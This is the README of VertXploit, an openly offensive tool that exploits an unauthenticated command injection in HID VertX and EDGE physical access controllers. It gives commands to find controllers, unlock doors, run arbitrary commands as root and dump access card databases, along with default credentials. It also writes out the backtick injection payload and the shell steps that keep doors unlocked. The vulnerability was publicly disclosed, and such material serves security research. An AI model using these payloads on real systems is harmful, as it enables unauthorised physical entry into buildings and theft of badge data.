# VertXploit
Exploiting HID VertX and EDGE access control systems

## Summary ##
VertXploit is a tool that can be used to exploit HID VertX and EDGE access control systems. 

A vulnerability exists within the discoveryd service, which fails to sanitize user data before executing system calls. This allows for arbitrary code execution on HID VertX and EDGE access control systems without needing to be authenticated. See the [Command Injection](https://github.com/coldfusion39/VertXploit/blob/master/README.md#command-injection) section for more information.

VertXploit can unlock or lock doors connected to the access control system, download the databases containing all of the provisioned/cached access control cards, and execute arbitrary commands as root on the VertX system, if vulnerable.

If the VertX controller's firmware has been recently updated, vertXploit will attempt to unlock or lock the doors through the web console by using the default, or user supplied, username and password.


## Requirements ##
Run `pip install -r requirements.txt` to install the required python modules.
 * [python-nmap](https://bitbucket.org/xael/python-nmap)
 * [requests](https://github.com/kennethreitz/requests)
 * [tabulate](https://bitbucket.org/astanin/python-tabulate)


## VertXploit Usage ##
Run `./vertXploit.py -h` to show the help menu, or `./vertXploit.py ACTION -h` to show help for a specific action.


### Discover ###
Run vertXploit with just the `discover` action argument to discover all HID access control systems on the local broadcast network. If an IP address is supplied with the optional `--ip IP` argument, vertXploit will use [python-nmap](https://bitbucket.org/xael/python-nmap) to scan that /24 network range for systems with port 4050 open. VertXploit will then send a discovery UDP packet to the identified IP address to determine if that systems is a HID access control panel.

Example:

`./vertXploit.py discover`

`./vertXploit.py discover --ip 10.1.10.5`


### Fingerprint ###
Once a controller is discovered, run vertXploit with the `fingerprint` action argument and the access controller's IP address to return detailed information about the access control panel.

Example:

`./vertXploit.py fingerprint 10.1.10.5`


### Unlock/Lock ###
In order to unlock or lock doors connected to the access control panel, run vertXploit with the `unlock` or `lock` action argument and the controller's IP address. If the controller is not vulnerable to the command injection exploit, vertXploit will attempt to unlock or lock the doors through the web console. This method uses the default username 'root' and default password 'pass', or you can supply your own with the `--username USERNAME` and `--password PASSWORD` arguments.

Example:

`./vertXploit.py unlock 10.1.10.5`

`./vertXploit.py unlock 10.1.10.5 --username test --password test`


### Raw ###
Arbitrary Linux commands can be executed on the access control system by using the `raw` action argument and the controller's IP address. The command may fail to execute if it is not installed on the controller (Python, Perl, Ruby, etc). As a simple proof of concept, the native Linux 'ping' command seems to work on all VertX and EDGE models tested.

Example:

`./vertXploit.py raw 10.1.10.5 'ping -c 5 10.1.10.39'`


### Download ###
To download the controller's card databases, run vertXploit with the `download` action argument and the controller's IP address. The controller <b>must</b> be vulnerable to the command injection vulnerability and you <b>must</b> be able to access the controller's web interface to download the two card databases. The default username 'root' and default password 'pass' are used for web authentication, or you can supply your own with the `--username USERNAME` and `--password PASSWORD` arguments.

Example:

`./vertXploit.py download 10.1.10.5`

`./vertXploit.py download 10.1.10.5 --username test --password test`


### Dump ###
After downloading the 'IdentDB' and 'AccessDB' databases from the controller, use the `dump` action argument to dump the contents of the databases. Optionally, you can specify the local file path to the databases with the `--path PATH` argument.

Example:

`./vertXploit.py dump`

`./vertXploit.py dump --path /root/VertX/DBs/`


## Command Injection ##
Typically multiple VertX or EDGE access controllers are installed and housed together. The diagnostic command `command_blink_on` can be sent to a specific controller which causes the panel's physical "Comm" LED to blink on and off for visual identification. This command usually terminates with the number of times the LED should blink, in the following case, 30 times.

`command_blink_on;044;00:11:22:33:44:55;30;`

By replacing the number of blinks with a Linux command wrapped in back ticks, the command will be executed on the access controller, as root.

``command_blink_on;044;00:11:22:33:44:55;`ping -c 5 10.1.10.39`;``

To remotely unlock and lock doors connected to the access control system, commands are echoed to `/tmp/a`. This is done because there is a length limit of 41 characters, not counting the two back ticks, that can be sent to the controller. <i>Note: echo is used instead of printf because some older VertX controllers are running BusyBox < 1.0.1 which does not include printf.</i>

Newlines from echoing the commands into the file are then removed by running `tr -d '\n' < /tmp/a > /tmp/b` and intentional newlines are inserted by running `tr '!' '\n' < /tmp/b > /tmp/a`.

The script `/tmp/a` is then executed and both files are deleted. Below shows what commands are being echoed into `/tmp/a` when the unlock and lock commands are sent to the VertX controller.

### Unlock ###
	# Set QUERY_STRING to the door unlock value
	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=1"

	# Run 'diagnostics_execute.cgi' script
	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi

	# Remove executable permissions to prevent the door from locking
	chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi

### Lock ###
	# Enable executable permissions
	chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi

	# Set QUERY_STRING to the door lock value
	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=0"

	# Run 'diagnostics_execute.cgi' script
	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi


## Resources ##
* [HeadlessZeke](https://github.com/headlesszeke/defcon24-demos) - Command injection vulnerability
* [ZDI](http://www.zerodayinitiative.com/advisories/ZDI-16-223/) - Public disclosure
* [TrendMicro Blog](http://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/) - Blog on command injection vulnerability
* [Brad Antoniewicz](http://nosedookie.blogspot.com/2011/07/hid-vertx-v2000-card-number-cache-tool.html) - Parsing card numbers from VertX cache
* [Other Work](http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html) - VertX discovery commands
